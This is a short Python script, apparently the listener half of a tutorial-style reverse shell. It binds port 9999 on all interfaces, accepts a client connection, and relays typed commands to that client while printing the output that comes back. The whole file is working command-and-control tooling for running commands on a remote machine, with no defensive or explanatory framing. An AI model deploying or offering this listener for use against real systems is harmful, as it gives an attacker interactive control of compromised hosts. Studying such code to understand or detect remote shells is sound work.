# import libraries
import socket
import sys


# create socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('socket connection error' + str(msg))


# Binding the socket and listening for connections
def bind_sockets():
    try:
        global host
        global port
        global s

        print('binding the port ' + str(port))
        print('server started waiting for connection')
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print('socket binding error ' + str(msg) + '\n' + 'retrying...')
        bind_sockets()


# Establish connection with client and socket must be listening

def socket_accept():
    conn, address = s.accept()
    print('connection has been established : ip address' + address[0] + 'port' + str(address[1]))
    print('run "echo hey" to get the client current working directory')
    send_commands(conn)
    conn.close()


# send command to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            clients_response = str(conn.recv(1024), "utf-8")
            print(clients_response, end="")


def main():
    create_socket()
    bind_sockets()
    socket_accept()


main()
